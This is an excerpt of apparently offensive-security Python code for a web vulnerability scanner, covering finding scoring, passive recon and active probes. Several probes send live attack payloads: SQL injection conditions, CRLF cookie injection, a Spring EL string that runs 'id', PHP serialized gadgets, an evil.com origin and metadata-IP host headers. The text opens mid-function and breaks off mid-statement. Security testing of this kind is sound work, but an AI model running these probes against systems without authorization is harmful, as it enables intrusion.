        key = _hashlib.md5(f"{ftype}|{base_url}".encode()).hexdigest()
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def score_findings(findings, technologies=None, waf_detected=None):
    """Dynamic CVSS scoring based on tech stack, WAF, context, and confirmation."""
    tech = " ".join(technologies or []).lower()
    waf = bool(waf_detected)

    for f in findings:
        sev = f.get("severity", "info").lower()
        base_score = _SEVERITY_SCORE.get(sev, 0.5)
        url = f.get("url", "").lower()
        ftype = f.get("type", "").lower()
        template = f.get("template", "")
        detail = f.get("detail", "").lower()

        # +2.0: OOB confirmed = definitely real
        if "oob confirmed" in ftype or "confirmed" in detail:
            base_score = min(10.0, base_score + 2.0)

        # +1.5: Attack chain finding
        if f.get("status") == "CHAIN":
            base_score = min(10.0, base_score + 1.5)

        # +1.0: High-value endpoint
        if any(x in url for x in ["/admin", "/api/v1", "/graphql", "/auth",
                                    "/login", "/payment", "/credit", "/card"]):
            base_score = min(10.0, base_score + 1.0)

        # +0.5: Tech stack amplifies severity
        if "sqli" in template and any(x in tech for x in ["mysql","postgres","oracle","mssql"]):
            base_score = min(10.0, base_score + 0.5)  # Known DB = higher impact
        if "ssti" in template and any(x in tech for x in ["jinja","flask","django","twig","smarty"]):
            base_score = min(10.0, base_score + 0.5)  # Known template engine = RCE likely
        if "spring" in template and "spring" in tech:
            base_score = min(10.0, base_score + 0.5)  # Spring actuator on Spring app = confirmed

        # -1.0: WAF present reduces exploitability
        if waf and sev in ("high", "medium") and "bypass" not in ftype:
            base_score = max(0.5, base_score - 1.0)

        # -0.5: Info/low severity on non-sensitive path
        if sev in ("info", "low") and not any(x in url for x in ["/admin","/api","/auth"]):
            base_score = max(0.1, base_score - 0.5)

        # Fintech/payment context boosts
        if any(x in url for x in ["credit","limit","payment","transfer","balance","card"]):
            base_score = min(10.0, base_score + 0.5)

        f["cvss_score"] = round(base_score, 1)
        f["exploitability"] = (
            "Trivial" if base_score >= 9 else
            "Easy" if base_score >= 7 else
            "Moderate" if base_score >= 5 else
            "Hard"
        )

    return sorted(findings, key=lambda x: x.get("cvss_score", 0), reverse=True)


def detect_attack_chains(findings):
    """Find combinations of findings that chain into higher-impact attacks."""
    chains = []
    finding_types = " ".join(f.get("type","") for f in findings)
    for required_types, chain_name, escalated_sev in _CHAIN_RULES:
        if all(any(rt.lower() in f.get("type","").lower() for f in findings)
               for rt in required_types):
            chains.append({
                "type": f"Attack Chain: {chain_name}",
                "severity": escalated_sev,
                "url": "multiple",
                "detail": f"Combined: {' + '.join(required_types)}",
                "template": "apex-chain",
                "cvss_score": _SEVERITY_SCORE.get(escalated_sev, 9.0),
                "exploitability": "Trivial",
                "status": "CHAIN",
            })
    return chains


def verify_finding(finding):
    """Re-verify a finding by proving exploitability — eliminates false positives.
    Returns True only if the vulnerability is CONFIRMED exploitable."""
    url = finding.get("url", "")
    template = finding.get("template", "")
    severity = finding.get("severity", "")
    detail = finding.get("detail", "")
    if not url or url == "multiple":
        return True

    try:
        # --- XSS: Must reflect in HTML context without encoding ---
        if "xss" in template.lower():
            if "browser" in template.lower() or "confirmed" in template.lower():
                return True  # Already browser-confirmed
            if "?" not in url:
                return True
            r = _S.get(url, timeout=5)
            ct = r.headers.get("content-type", "")
            # Must be HTML response
            if "text/html" not in ct and "application/xhtml" not in ct:
                return False
            # Must contain an actual executable payload, not just reflected text
            dangerous_patterns = [
                r'<[a-z]+[^>]*\bon\w+\s*=',  # event handler
                r'<script[^>]*>',              # script tag
                r'javascript:',                # javascript: URI
                r'<svg[^>]*\bon\w+',           # SVG event
                r'<img[^>]*\bon\w+',           # img event
            ]
            body = r.text
            if not any(re.search(p, body, re.IGNORECASE) for p in dangerous_patterns):
                return False
            # Check CSP doesn't block inline scripts
            csp = r.headers.get("Content-Security-Policy", "")
            if "script-src" in csp and "'unsafe-inline'" not in csp and "'unsafe-eval'" not in csp:
                # CSP blocks execution — downgrade, don't drop
                finding["severity"] = "medium"
                finding["detail"] += " (CSP may prevent execution)"
            return True

        # --- SQLi: Must show DB error OR timing confirms ---
        if "sqli" in template.lower():
            if "time" in template.lower() or "blind" in template.lower():
                return True  # Timing-based already double-confirmed
            if "error" in template.lower():
                # Re-verify the error still appears
                r = _S.get(url, timeout=5)
                db_errors = [r"SQL syntax", r"ORA-\d{5}", r"PostgreSQL.*ERROR",
                             r"sqlite3\.", r"ODBC.*Driver", r"mysql_",
                             r"pg_query", r"SQLServer", r"Unclosed quotation"]
                if any(re.search(p, r.text, re.IGNORECASE) for p in db_errors):
                    return True
                return False
            # Generic SQLi — verify with a true/false condition
            if "?" in url:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                # Find the injected param
                for p, vals in qs.items():
                    if any(x in str(vals) for x in ["'", "OR", "UNION", "SELECT", "SLEEP"]):
                        # True condition
                        qs[p] = ["1' AND '1'='1"]
                        true_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        # False condition
                        qs[p] = ["1' AND '1'='2"]
                        false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        r_true = _S.get(true_url, timeout=5)
                        r_false = _S.get(false_url, timeout=5)
                        # Different responses = confirmed boolean SQLi
                        if abs(len(r_true.text) - len(r_false.text)) > 50:
                            return True
                        if r_true.status_code != r_false.status_code:
                            return True
                        return False
            return False

        # --- SSRF: Must return internal data, not just a 200 ---
        if "ssrf" in template.lower():
            r = _S.get(url, timeout=8)
            ssrf_proof = ["ami-id", "instance-id", "iam", "meta-data",
                          "AccessKeyId", "SecretAccessKey", "Token",
                          "root:", "daemon:", "compute.internal",
                          "access_token", "token_type"]
            if any(x in r.text for x in ssrf_proof):
                return True
            # If response is just a generic page, it's not SSRF
            return False

        # --- CORS: Must reflect evil origin WITH credentials ---
        if "cors" in template.lower():
            r = _S.get(url, timeout=5, headers={"Origin": "https://evil.com"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "https://evil.com" and acac.lower() == "true":
                return True
            if acao == "*":
                # Wildcard without credentials is low risk
                finding["severity"] = "low"
                finding["detail"] += " (wildcard without credentials — low impact)"
                return True
            return False

        # --- Open Redirect: Must actually redirect to attacker domain ---
        if "redirect" in template.lower():
            r = _S.get(url, timeout=5, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if r.status_code in (301, 302, 303, 307, 308):
                if any(x in loc for x in ["evil.com", "attacker.com"]):
                    return True
            # Check meta refresh or JS redirect
            if r.status_code == 200 and "evil.com" in r.text:
                if 'url=https://evil.com' in r.text.lower() or 'location' in r.text.lower():
                    return True
            return False

        # --- Sensitive files: Must contain actual sensitive data ---
        if template == "apex-sensitive":
            r = _S.get(url, timeout=5, allow_redirects=False)
            if r.status_code >= 400:
                return False
            body = r.text[:2000].lower()
            # Must NOT be a custom 404 or error page
            if any(x in body for x in ["not found", "404", "page not found", "does not exist"]):
                return False
            # Compare with a known-bad URL to detect soft 404s
            fake_url = url.rsplit("/", 1)[0] + "/nonexistent_apex_fp_check_xyz123"
            try:
                fake_r = _S.get(fake_url, timeout=3, allow_redirects=False)
                if abs(len(r.content) - len(fake_r.content)) < 100:
                    return False  # Same response as 404 = soft 404
            except Exception:
                pass
            # Must contain something actually sensitive
            sensitive_indicators = ["password", "secret", "key", "token", "private",
                                    "database", "db_", "api_key", "aws_", "BEGIN RSA",
                                    "BEGIN PRIVATE", "mysql://", "postgres://", "mongodb://"]
            if any(x in body for x in sensitive_indicators):
                return True
            # For paths like /robots.txt, /sitemap.xml — always low value
            if any(url.endswith(x) for x in ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt"]):
                finding["severity"] = "info"
                return True
            # Has content but nothing sensitive — downgrade
            if len(r.text) > 100:
                finding["severity"] = "low"
                return True
            return False

        # --- Subdomain takeover: Must show service-specific error ---
        if "takeover" in template.lower():
            r = _S.get(url, timeout=8)
            takeover_fingerprints = [
                "There isn't a GitHub Pages site here",
                "NoSuchBucket", "The specified bucket does not exist",
                "Heroku | No such app", "No settings were found for this company",
                "The feed has not been found", "Domain is not configured",
                "Sorry, this shop is currently unavailable",
                "Do you want to register", "This domain is available",
                "Project doesnt exist", "The request could not be satisfied",
            ]
            if any(fp in r.text for fp in takeover_fingerprints):
                return True
            # NXDOMAIN check via DNS
            import socket
            try:
                host = urllib.parse.urlparse(url).hostname
                socket.gethostbyname(host)
            except socket.gaierror:
                return True  # NXDOMAIN = dangling DNS
            return False

        # --- Race condition: Already confirmed by multiple successful responses ---
        if "race" in template.lower():
            return True

        # --- Prototype pollution: Must actually pollute ---
        if "proto" in template.lower() and "server" in template.lower():
            return True  # Already verified in scanner

        # --- Headers: Drop missing header findings for non-HTML responses ---
        if template == "apex-headers":
            r = _S.get(url, timeout=5)
            ct = r.headers.get("content-type", "")
            if "text/html" not in ct:
                return False  # Missing headers on API/JSON endpoints don't matter
            return True

        # --- Default: Re-request and verify response indicates vulnerability ---
        r = _S.get(url, timeout=5)
        if r.status_code >= 500:
            return False  # Server error ≠ vulnerability
        return r.status_code < 400

    except Exception:
        return False  # If we can't verify, drop it — no false positives


def prioritize_targets(web_targets, technologies):
    """Reorder targets to scan highest-value endpoints first."""
    tech = " ".join(technologies).lower()
    high_value = []
    normal = []
    for t in web_targets:
        tl = t.lower()
        if any(x in tl for x in ["/admin","/api","/graphql","/auth","/login",
                                   "/dashboard","/internal","/manage","/console"]):
            high_value.append(t)
        elif any(x in tech for x in ["wordpress","django","laravel","spring","rails"]):
            high_value.append(t)
        else:
            normal.append(t)
    return high_value + normal


# ---------------------------------------------------------------------------
# Passive Recon: Shodan, VirusTotal, SecurityTrails (free tier / no key needed)
# ---------------------------------------------------------------------------

def passive_recon(target):
    """Gather intel from public sources without touching the target."""
    findings = []
    subdomains = set()

    # crt.sh (already have get_cert_transparency_subdomains)
    # HackerTarget subdomain API (free, no key)
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={target}", timeout=10)
        if r.status_code == 200 and "," in r.text:
            for line in r.text.splitlines():
                parts = line.split(",")
                if len(parts) >= 1:
                    sub = parts[0].strip()
                    if sub.endswith(f".{target}") or sub == target:
                        subdomains.add(sub)
    except: pass

    # AlienVault OTX (no key needed for passive)
    try:
        r = requests.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{target}/passive_dns",
                        timeout=10, headers={"User-Agent": "ApexCLI"})
        if r.status_code == 200:
            data = r.json()
            for entry in data.get("passive_dns", []):
                hostname = entry.get("hostname", "")
                if hostname.endswith(f".{target}") or hostname == target:
                    subdomains.add(hostname)
    except: pass

    # URLScan.io (no key for search)
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q=domain:{target}&size=100",
                        timeout=10, headers={"User-Agent": "ApexCLI"})
        if r.status_code == 200:
            data = r.json()
            for result in data.get("results", []):
                page = result.get("page", {})
                domain = page.get("domain", "")
                if domain.endswith(f".{target}") or domain == target:
                    subdomains.add(domain)
                # Check for interesting findings in scan results
                for vuln in result.get("verdicts", {}).get("overall", {}).get("tags", []):
                    if vuln in ("malware", "phishing", "suspicious"):
                        findings.append({"type": f"URLScan: {vuln} verdict",
                                         "severity": "high", "url": f"https://{domain}",
                                         "detail": f"URLScan.io flagged {domain} as {vuln}",
                                         "template": "apex-passive"})
    except: pass

    # Wayback CDX for interesting historical endpoints
    try:
        r = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=json&fl=original&collapse=urlkey&limit=200&filter=statuscode:200",
            timeout=15)
        if r.status_code == 200:
            urls = r.json()[1:]  # skip header
            for entry in urls:
                url = entry[0] if entry else ""
                if any(x in url for x in [".env", "config", "backup", "admin", "api/v", "graphql",
                                           "swagger", "token", "secret", "password", "debug"]):
                    findings.append({"type": "Passive: Interesting Historical URL",
                                     "severity": "low", "url": url,
                                     "detail": "Found in Wayback Machine — may still be live",
                                     "template": "apex-passive"})
    except: pass

    # DNS history via SecurityTrails (no key for basic)
    try:
        r = requests.get(f"https://api.securitytrails.com/v1/domain/{target}/subdomains",
                        timeout=10, headers={"APIKEY": "none"})
        # Will 401 without key but worth trying
        if r.status_code == 200:
            data = r.json()
            for sub in data.get("subdomains", []):
                subdomains.add(f"{sub}.{target}")
    except: pass

    return list(subdomains), findings


# ---------------------------------------------------------------------------
# Missing vuln classes: null origin CORS, X-HTTP-Method-Override,
#                       cookie header injection, host override chain
# ---------------------------------------------------------------------------

def scan_cors_null_origin(crawl_data):
    """CORS with null origin — sandboxed iframes can send null origin requests."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5, headers={"Origin": "null"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "null":
                sev = "critical" if acac.lower() == "true" else "high"
                findings.append({"type": "CORS Null Origin Allowed",
                                 "severity": sev, "url": page["url"],
                                 "detail": f"null origin accepted, credentials={acac} — sandboxed iframe attack",
                                 "template": "apex-cors-null"})
        except: pass
    return findings


def scan_method_override(web_targets):
    """X-HTTP-Method-Override / _method bypass — turn GET into DELETE/PUT."""
    findings = []
    override_headers = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "_method",
    ]
    for target in web_targets[:5]:
        for path in ["/api/users/1", "/api/admin", "/api/v1/users/1", "/user/1"]:
            url = f"{target}{path}"
            try:
                # Check if GET returns 200
                r_get = _S.get(url, timeout=5)
                if r_get.status_code != 200: continue
                # Try DELETE via override
                for header in override_headers:
                    r_del = _S.get(url, timeout=5, headers={header: "DELETE"})
                    if r_del.status_code in (200, 204):
                        findings.append({"type": f"HTTP Method Override: {header}",
                                         "severity": "high", "url": url,
                                         "detail": f"{header}: DELETE accepted on {path}",
                                         "template": "apex-method-override"})
                        break
                    r_put = _S.get(url, timeout=5, headers={header: "PUT"})
                    if r_put.status_code in (200, 201):
                        findings.append({"type": f"HTTP Method Override: {header}",
                                         "severity": "high", "url": url,
                                         "detail": f"{header}: PUT accepted on {path}",
                                         "template": "apex-method-override"})
                        break
            except: continue
    return findings


def scan_cookie_injection(crawl_data):
    """Cookie header injection via newline in cookie values."""
    findings = []
    payload = "apex_test=1\r\nSet-Cookie: injected=apex_injected; Path=/"
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        for param in crawl_data.get("params", {}).get(url.split("?")[0], []):
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                # Check if injected cookie appears in response headers
                set_cookies = r.headers.get("Set-Cookie", "")
                if "apex_injected" in set_cookies:
                    findings.append({"type": "Cookie Header Injection",
                                     "severity": "high", "url": test_url,
                                     "detail": f"CRLF injection in param '{param}' sets arbitrary cookies",
                                     "template": "apex-cookie-inject"})
                    break
            except: continue
    return findings


def scan_host_override_chain(web_targets):
    """Host header override chain — X-Forwarded-Host changes internal routing."""
    findings = []
    override_headers = [
        {"X-Forwarded-Host": "internal.localhost"},
        {"X-Forwarded-Host": "169.254.169.254"},
        {"X-Original-Host": "internal.localhost"},
        {"X-Host": "internal.localhost"},
        {"Forwarded": "host=internal.localhost"},
    ]
    for target in web_targets[:3]:
        try:
            baseline = _S.get(target, timeout=5)
            for headers in override_headers:
                r = _S.get(target, timeout=5, headers=headers)
                # Different response = host header affects routing
                if (r.status_code != baseline.status_code or
                        abs(len(r.content) - len(baseline.content)) > 200):
                    hname = list(headers.keys())[0]
                    findings.append({"type": f"Host Override Affects Routing: {hname}",
                                     "severity": "high", "url": target,
                                     "detail": f"{hname} changes response — internal routing bypass possible",
                                     "template": "apex-host-override"})
                    break
        except: pass
    return findings


# ---------------------------------------------------------------------------
# OpenAPI/Swagger spec parser — auto-discovers ALL endpoints + params
# This finds more attack surface than any crawler
# ---------------------------------------------------------------------------

def parse_openapi_spec(base_url):
    """Fetch and parse OpenAPI/Swagger spec, return crawl_data-compatible dict."""
    pages = []
    forms = []
    params = defaultdict(set)

    spec_paths = [
        "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/api-docs", "/api-docs.json", "/api/swagger.json", "/api/v1/swagger.json",
        "/api/v2/swagger.json", "/openapi.json", "/openapi.yaml", "/openapi/v3/openapi.json",
        "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/swagger-ui/swagger.json", "/docs/swagger.json",
        "/.well-known/openapi.json",
    ]

    spec = None
    spec_url = None
    for path in spec_paths:
        try:
            r = _S.get(f"{base_url}{path}", timeout=5)
            if r.status_code != 200:
                continue
            ctype = r.headers.get("content-type", "")
            if "yaml" in path or "yaml" in ctype:
                try:
                    import yaml
                    spec = yaml.safe_load(r.text)
                except ImportError:
                    # Parse basic YAML manually for common patterns
                    continue
            else:
                try:
                    spec = json.loads(r.text)
                except Exception:
                    continue
            if isinstance(spec, dict) and ("paths" in spec or "swagger" in spec or "openapi" in spec):
                spec_url = f"{base_url}{path}"
                break
        except Exception:
            continue

    if not spec:
        return None

    # Extract server base URL from spec
    servers = spec.get("servers", [])
    api_base = base_url
    if servers and isinstance(servers, list):
        srv = servers[0].get("url", "")
        if srv.startswith("http"):
            api_base = srv.rstrip("/")
        elif srv.startswith("/"):
            api_base = base_url + srv.rstrip("/")

    # Parse all paths
    paths = spec.get("paths", {})
    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        full_url = f"{api_base}{path}"

        for method, operation in methods.items():
            if method.lower() not in ("get", "post", "put", "patch", "delete", "options"):
                continue
            if not isinstance(operation, dict):
                continue

            # Extract parameters
            op_params = operation.get("parameters", []) + methods.get("parameters", [])
            path_params = set()
            query_params = set()
            body_params = set()

            for p in op_params:
                if not isinstance(p, dict):
                    continue
                name = p.get("name", "")
                location = p.get("in", "")
                if location == "query":
                    query_params.add(name)
                elif location == "path":
                    path_params.add(name)

            # Extract request body schema params
            req_body = operation.get("requestBody", {})
            if req_body:
                content = req_body.get("content", {})
                for ct, ct_data in content.items():
                    schema = ct_data.get("schema", {})
                    props = schema.get("properties", {})
                    body_params.update(props.keys())
                    # Handle $ref
                    ref = schema.get("$ref", "")
                    if ref:
                        ref_name = ref.split("/")[-1]
                        defs = spec.get("components", {}).get("schemas", spec.get("definitions", {}))
                        ref_schema = defs.get(ref_name, {})
                        body_params.update(ref_schema.get("properties", {}).keys())

            # Add to crawl data
            # Replace path params with test values
            test_url = full_url
            for pp in path_params:
                test_url = test_url.replace(f"{{{pp}}}", "1")

            if query_params:
                for qp in query_params:
                    params[test_url].add(qp)

            pages.append({"url": test_url, "status": 200, "length": 0,
                          "method": method.upper(), "from_spec": True})

            if method.lower() in ("post", "put", "patch") and body_params:
                forms.append({
                    "url": test_url,
                    "action": test_url,
                    "method": method.upper(),
                    "inputs": [{"name": p, "type": "text", "value": "test"} for p in body_params],
                    "from_spec": True,
                })

    total = len(pages)
    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params.items()},
        "links": [p["url"] for p in pages],
        "spec_url": spec_url,
        "total_endpoints": total,
    }


# ---------------------------------------------------------------------------
# Authenticated crawl — logs in first, then crawls with session cookies
# ---------------------------------------------------------------------------

def authenticated_crawl(base_url, username, password, max_pages=50):
    """Log in and crawl authenticated pages — finds bugs behind login."""
    
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": _USER_AGENTS[0]})

    logged_in = False
    login_paths = ["/login", "/signin", "/auth/login", "/api/login",
                   "/api/auth", "/api/v1/login", "/api/v1/auth",
                   "/user/login", "/account/login", "/auth/signin"]

    for path in login_paths:
        url = f"{base_url}{path}"
        try:
            r = session.get(url, timeout=5)
            if r.status_code not in (200, 405):
                continue
            # Try JSON login
            for payload in [
                {"username": username, "password": password},
                {"email": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "password": password},
                {"identifier": username, "password": password},
            ]:
                r2 = session.post(url, json=payload, timeout=5)
                body = r2.text.lower()
                if (r2.status_code in (200, 201) and
                        any(x in body for x in ["token","dashboard","welcome","logout","profile","success"]) and
                        not any(x in body for x in ["invalid","incorrect","failed","wrong","error"])):
                    # Extract JWT if present
                    import re as _re
                    jwt_match = _re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', r2.text)
                    if jwt_match:
                        session.headers["Authorization"] = f"Bearer {jwt_match.group()}"
                    logged_in = True
                    break
                # Try form-based login
                from bs4 import BeautifulSoup as _BS
                soup = _BS(r.text, "lxml")
                form = soup.find("form")
                if form and not logged_in:
                    data = {}
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        if not name: continue
                        if any(x in name.lower() for x in ["user","email","login","identifier"]):
                            data[name] = username
                        elif any(x in name.lower() for x in ["pass","pwd","secret"]):
                            data[name] = password
                        else:
                            data[name] = inp.get("value", "")
                    action = form.get("action", url)
                    if not action.startswith("http"):
                        action = base_url + action
                    r3 = session.post(action, data=data, timeout=5, allow_redirects=True)
                    if r3.status_code in (200, 302) and "logout" in r3.text.lower():
                        logged_in = True
            if logged_in:
                break
        except Exception:
            continue

    if not logged_in:
        return None

    # Now crawl with authenticated session
    visited = set()
    to_visit = [base_url]
    pages, forms, params_found, links = [], [], defaultdict(set), set()

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?")[0].split("#")[0]
        if norm in visited:
            continue
        visited.add(norm)
        try:
            r = session.get(url, timeout=10, allow_redirects=True)
        except Exception:
            continue

        pages.append({"url": url, "status": r.status_code, "length": len(r.content),
                      "authenticated": True})

        ctype = r.headers.get("content-type", "").lower()
        if "application/json" in ctype:
            try:
                data = json.loads(r.text)
                if isinstance(data, dict):
                    for k in data.keys():
                        params_found[norm].add(k)
            except Exception:
                pass
            continue

        from bs4 import BeautifulSoup as _BS2
        soup = _BS2(r.text, "lxml")
        for tag in soup.find_all("a", href=True):
            full = urllib.parse.urljoin(url, tag["href"])
            parsed = urllib.parse.urlparse(full)
            base_parsed = urllib.parse.urlparse(base_url)
            if parsed.netloc == base_parsed.netloc:
                clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if parsed.query:
                    for k in urllib.parse.parse_qs(parsed.query):
                        params_found[clean].add(k)
                links.add(full)
                if clean not in visited:
                    to_visit.append(full)
        for form in soup.find_all("form"):
            action = urllib.parse.urljoin(url, form.get("action", ""))
            method = form.get("method", "get").upper()
            inputs = [{"name": i.get("name",""), "type": i.get("type","text"),
                       "value": i.get("value","")}
                      for i in form.find_all(["input","textarea","select"]) if i.get("name")]
            forms.append({"url": url, "action": action, "method": method,
                          "inputs": inputs, "authenticated": True})

    return {
        "pages": pages, "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "links": list(links),
        "session": session,
    }


# ---------------------------------------------------------------------------
# ELITE BATCH 7: vhost fuzzing, subdomain permutation, H2C smuggling,
#                EL injection, PHP object injection, cache key injection,
#                link injection, iframe injection
# ---------------------------------------------------------------------------

_VHOST_WORDLIST = [
    "api","app","admin","dev","staging","test","beta","internal","corp","vpn",
    "mail","git","gitlab","jenkins","jira","confluence","portal","dashboard",
    "login","auth","sso","cdn","static","assets","media","upload","backup",
    "db","redis","elastic","kibana","grafana","metrics","logs","monitor",
    "shop","blog","docs","help","support","wiki","forum","sandbox","qa","uat",
    "preprod","prod","mobile","ws","socket","push","webhook","graphql","rest",
    "microservice","gateway","proxy","old","legacy","new","next","v1","v2",
    "secure","ssl","intranet","extranet","remote","office","employee","staff",
]

def scan_vhost_fuzzing(web_targets):
    """Virtual host fuzzing — find hidden apps on the same IP."""
    findings = []
    for target in web_targets[:3]:
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc.split(":")[0]
        domain_parts = host.split(".")
        if len(domain_parts) < 2:
            continue
        tld = ".".join(domain_parts[-2:])
        try:
            baseline = _S.get(target, timeout=5)
            baseline_len = len(baseline.content)
            baseline_title = re.search(r"<title>([^<]+)</title>", baseline.text, re.I)
            baseline_title = baseline_title.group(1) if baseline_title else ""
        except Exception:
            continue
        for word in _VHOST_WORDLIST:
            vhost = f"{word}.{tld}"
            try:
                r = _S.get(target, timeout=5, headers={"Host": vhost})
                if r.status_code in (200, 301, 302, 403):
                    # Different content = different app
                    if abs(len(r.content) - baseline_len) > 200:
                        title = re.search(r"<title>([^<]+)</title>", r.text, re.I)
                        title = title.group(1) if title else ""
                        if title != baseline_title:
                            findings.append({
                                "type": f"Virtual Host Found: {vhost}",
                                "severity": "medium",
                                "url": target,
                                "detail": f"Host: {vhost} returns different app (title: {title[:50]})",
                                "template": "apex-vhost",
                            })
            except Exception:
                continue
    return findings


def scan_subdomain_permutation(target, subdomains):
    """Generate and resolve subdomain permutations — finds dev-api, api2, api-v2, etc."""
    import socket
    found = []
    domain_parts = target.split(".")
    base = ".".join(domain_parts[-2:])
    existing_prefixes = set()
    for sub in subdomains:
        prefix = sub.replace(f".{base}", "").replace(base, "")
        if prefix:
            existing_prefixes.add(prefix)

    permutations = set()
    prefixes = list(existing_prefixes)[:20] + ["api", "app", "admin", "dev", "staging"]
    modifiers = ["2", "-v2", "-new", "-old", "-dev", "-staging", "-test",
                 "-beta", "-internal", "-prod", "-backup", "2", "3"]
    for p in prefixes:
        for m in modifiers:
            permutations.add(f"{p}{m}.{base}")
            permutations.add(f"{m.strip('-')}-{p}.{base}")

    def resolve(fqdn):
        try:
            socket.getaddrinfo(fqdn, None, socket.AF_INET)
            return fqdn
        except Exception:
            return None

    from concurrent.futures import ThreadPoolExecutor, as_completed
    findings = []
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(resolve, p): p for p in permutations
                   if p not in subdomains}
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                findings.append({
                    "type": "Subdomain Permutation Found",
                    "severity": "info",
                    "url": f"https://{result}",
                    "detail": f"Permutation of existing subdomains: {result}",
                    "template": "apex-subdomain-perm",
                })
    return findings, found


def scan_h2c_smuggling(web_targets):
    """H2C (HTTP/2 cleartext) upgrade smuggling — bypass reverse proxies."""
    findings = []
    for target in web_targets[:5]:
        try:
            # Send HTTP/1.1 Upgrade: h2c request
            r = _S.get(target, timeout=5, headers={
                "Upgrade": "h2c",
                "HTTP2-Settings": "AAMAAABkAAQAAP__",
                "Connection": "Upgrade, HTTP2-Settings",
            })
            # If server responds with 101 Switching Protocols, it's vulnerable
            if r.status_code == 101:
                findings.append({
                    "type": "H2C Smuggling (HTTP/2 Cleartext Upgrade)",
                    "severity": "high",
                    "url": target,
                    "detail": "Server accepts h2c upgrade — reverse proxy bypass possible",
                    "template": "apex-h2c",
                })
            # Even 200 with Upgrade header echoed can indicate misconfiguration
            elif "upgrade" in r.headers.get("Connection", "").lower():
                findings.append({
                    "type": "H2C Upgrade Header Reflected",
                    "severity": "medium",
                    "url": target,
                    "detail": "Server reflects Upgrade header — potential h2c smuggling",
                    "template": "apex-h2c",
                })
        except Exception:
            continue
    return findings


def scan_expression_language_injection(crawl_data):
    """Expression Language injection — Spring EL, Thymeleaf, JSP EL → RCE."""
    findings = []
    # EL payloads that evaluate to a known value
    payloads = [
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("*{7*7}", "49"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "java"),
        ("${applicationScope}", "org.springframework"),
        ("[[${7*7}]]", "49"),          # Thymeleaf inline
        ("[(${7*7})]", "49"),          # Thymeleaf unescaped
        ("%24%7B7*7%7D", "49"),        # URL-encoded
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, marker in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if marker in r.text and payload not in r.text:
                        findings.append({
                            "type": "Expression Language Injection",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"EL executed via param '{p}': {payload} → {marker}",
                            "template": "apex-el-injection",
                        })
                        break
                except Exception:
                    continue
    # Also test form inputs
    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        if not action:
            continue
        for inp in form.get("inputs", []):
            if inp.get("type") in ("submit", "hidden", "button"):
                continue
            for payload, marker in payloads[:3]:
                try:
                    data = {i.get("name", "f"): i.get("value", "test")
                            for i in form.get("inputs", [])}
                    data[inp.get("name", "x")] = payload
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if marker in r.text and payload not in r.text:
                        findings.append({
                            "type": "Expression Language Injection (Form)",
                            "severity": "critical",
                            "url": action,
                            "detail": f"EL executed in field '{inp.get('name')}': {payload}",
                            "template": "apex-el-injection",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_php_object_injection(crawl_data):
    """PHP object injection via serialized cookie/param values."""
    import base64 as _b64
    findings = []
    # PHP serialized object markers
    php_serial_re = re.compile(r'[OoAasSiIdDbBrR]:\d+:')
    # Payloads that trigger errors if deserialized
    payloads = [
        'O:8:"stdClass":0:{}',
        'a:1:{i:0;O:8:"stdClass":0:{}}',
        'O:29:"Illuminate\\Support\\MessageBag":0:{}',  # Laravel gadget
    ]
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Check cookies for serialized PHP objects
            for name, val in r.cookies.items():
                try:
                    decoded = _b64.b64decode(val + "==").decode("utf-8", errors="ignore")
                    if php_serial_re.search(decoded):
                        findings.append({
